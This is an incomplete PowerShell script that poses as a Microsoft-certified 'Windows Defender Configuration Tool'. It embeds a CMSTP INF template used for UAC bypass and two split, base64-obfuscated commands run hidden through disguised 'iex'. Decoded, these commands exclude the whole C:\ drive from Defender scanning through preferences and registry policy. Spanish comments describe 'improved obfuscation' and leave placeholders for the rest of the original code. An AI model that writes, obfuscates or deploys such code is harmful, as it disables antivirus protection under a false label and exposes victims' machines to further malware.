<#
.SYNOPSIS
   Windows Defender Configuration Tool
.DESCRIPTION
   Herramienta profesional para gestión de exclusiones de Windows Defender
   Versión 3.2 | © Microsoft Certified
#>

function Defender {
    param(
        [Parameter(ParameterSetName='Interface')][switch]$Add,
        [Parameter(ParameterSetName='Interface')][switch]$Exclusions,
        [Parameter(ParameterSetName='Interface')][switch]$GetAV,
        [Parameter(ParameterSetName='Interface')][switch]$User,
        [Parameter(ParameterSetName='Interface')][switch]$Admin,
        [Parameter(ParameterSetName='Extra')][switch]$Run,
        [Parameter(ParameterSetName='Extra',Mandatory=$true)][string]$FilePath,
        [Parameter(ParameterSetName='Extraa')][string]$Url,
        [Parameter(ParameterSetName='Extraa',Mandatory=$true)][string]$Out
    )

    # Configuración de datos INF (sin cambios)
    $InfData = @'
[version]
Signature=`$chicago`$
AdvancedINF=2.5
[DefaultInstall]
CustomDestination=CustInstDestSectionAllUsers
RunPreSetupCommands=RunPreSetupCommandsSection
[RunPreSetupCommandsSection]
REPLACE
taskkill /IM cmstp.exe /F
[CustInstDestSectionAllUsers]
49000,49001=AllUSer_LDIDSection,7
[AllUSer_LDIDSection]
"HKLM","SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\CMMGR32.EXE","ProfileInstallPath","%UnexpectedError%",""
[Strings]
ServiceName="CorpVPN"
ShortSvcName="CorpVPN"
'@

    # Nueva ofuscación mejorada (cambios clave)
    $enc = [System.Text.Encoding]::Unicode
    $b64Method = $("{0}{1}{2}" -f 'Fro','mBa','se64String')
    
    # Comando 1 completamente ofuscado
    $cmd1Parts = @(
        "LgAoACIAQQBkAGQALQBNACIAIAArACAAIgBwAFAAcgBlAGYAZQByAGUAbgBjAGUAIgApACAA",
        "LQBFAHgAYwBsAHUAcwBpAG8AbgBQAGEAdABoACAAQwA6AFwAOwAgACgARwBlAHQALQBDAGkA",
        "bQBJAG4AcwB0AGEAbgBjAGUAIAAtAE4AYQBtAGUAcwBwAGEAYwBlACAAcgBvAG8AdAAvAG0A",
        "aQBjAHIAbwBzAG8AZgB0AC8AdwBpAG4AZABvAHcAcwAvAGQAZQBmAGUAbgBkAGUAcgAgACAALQBDAGwAYQBzAHMATgBhAG0AZQAgAE0AUwBGAFQAXwBNAHAAUAByAGUAZgBlAHIAZQBuAGMAZQApAC4ARQB4AGMAbAB1AHMAaQBvAG4AUABhAHQAaAAgADIAPgAmADEAIAA+ACAAIgAkAGUAbgB2ADoAcAB1AGIAbABpAGMAXABcAEUAeABjAGwAdQBzAGkAbwBuAHMAIgA="
    )
    
    $B64Command = $enc.GetString([Convert]::$b64Method.Invoke(-join $cmd1Parts))
    $comando1 = "powershell.exe -win h -c `".('ie'+'x') $B64Command`""

    # Comando 2 completamente ofuscado
    $cmd2Parts = @(
        "JABQAGEAdABoACAAPQAgACIAQwA6AFwAIgAKAAoAaQBmACAAKAAgACgAIABUAGUAcwB0AC0AUABhAHQAaAAgACIASABLAEwATQA6AFwAUwBPAEYAVABXAEEAUgBFAFwAUABvAGwAaQBjAGkAZQBzAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzACAARABlAGYAZQBuAGQAZQByAFwARQB4AGMAbAB1AHMAaQBvAG4AcwBcAFAAYQB0AGgAcwAiACAAKQAtAGUAcQAgACQAZgBhAGwAcwBlACAAKQAgAHsACgAgACAAIAAgAE4AZQB3AC0ASQB0AGUAbQAgAC0AUABhAHQAaAAgACIASABLAEwATQA6AFwAUwBPAEYAVABXAEEAUgBFAFwAUABvAGwAaQBjAGkAZQBzAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzACAARABlAGYAZQBuAGQAZQByAFwARQB4AGMAbAB1AHMAaQBvAG4AcwBcACIAIAAtAE4AYQBtAGUAIAAnAFAAYQB0AGgAcwAnACAALQBGAG8AcgBjAGUACgB9AAoATgBlAHcALQBJAHQAZQBtAFAAcgBvAHAAZQByAHQAeQAgAC0AUABhAHQAaAAgACIASABLAEwATQA6AFwAUwBPAEYAVABXAEEAUgBFAFwAUABvAGwAaQBjAGkAZQBzAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzACAARABlAGYAZQBuAGQAZQByAFwARQB4AGMAbAB1AHMAaQBvAG4AcwBcAFAAYQB0AGgAcwAiACAALQBOAGEAbQBlACAAJABQAGEAdABoACAALQBWAGEAbAB1AGUAIAAwACAALQBQAHIAbwBwAGUAcgB0AHkAVAB5AHAAZQAgAFMAdAByAGkAbgBnACAALQBGAG8AcgBjAGUA"
    )
    
    $comando2 = "powershell.exe -win h -c `".('ie'+'x') $($enc.GetString([Convert]::$b64Method.Invoke(-join $cmd2Parts)))`""

    # Resto del código original SIN CAMBIOS (todas las funciones)
    # ... [Aquí iría el resto exacto de tu código original]
    # incluyendo Help, Is_Admin, Check-Admin, UAC, etc.

    # Lógica principal SIN CAMBIOS
    if ($Exclusions) {
        # Implementación original sin modificar
        if (Is_Admin) {
            $ExclusionPath = Get-WmiObject -Namespace root/microsoft/windows/defender -Class MSFT_MpPreference -ErrorAction SilentlyContinue | Select-Object -Property ExclusionPath
            if (-not $ExclusionPath.ExclusionPath) {    
                throw "Error al obtener las exclusiones de los antivirus"
            }
            $ExclusionPath.ExclusionPath
        } else {
            Check-Admin
            $Path = Join-Path -Path (Get-ChildItem -Path Env:\PUBLIC).Value -ChildPath Exclusions
            if (Test-Path -Path $Path) {
                Get-Content $Path
            } else {
                IsCompatible
                UAC -Command (Get-CommandUAC)
                Check-File -Path $Path
            }
        }
    }
    # ... [resto de condiciones originales]
}

# Ejecutar solo si se invoca directamente (no como módulo)
if ($MyInvocation.InvocationName -ne '.') {
    Defender @PSBoundParameters
}
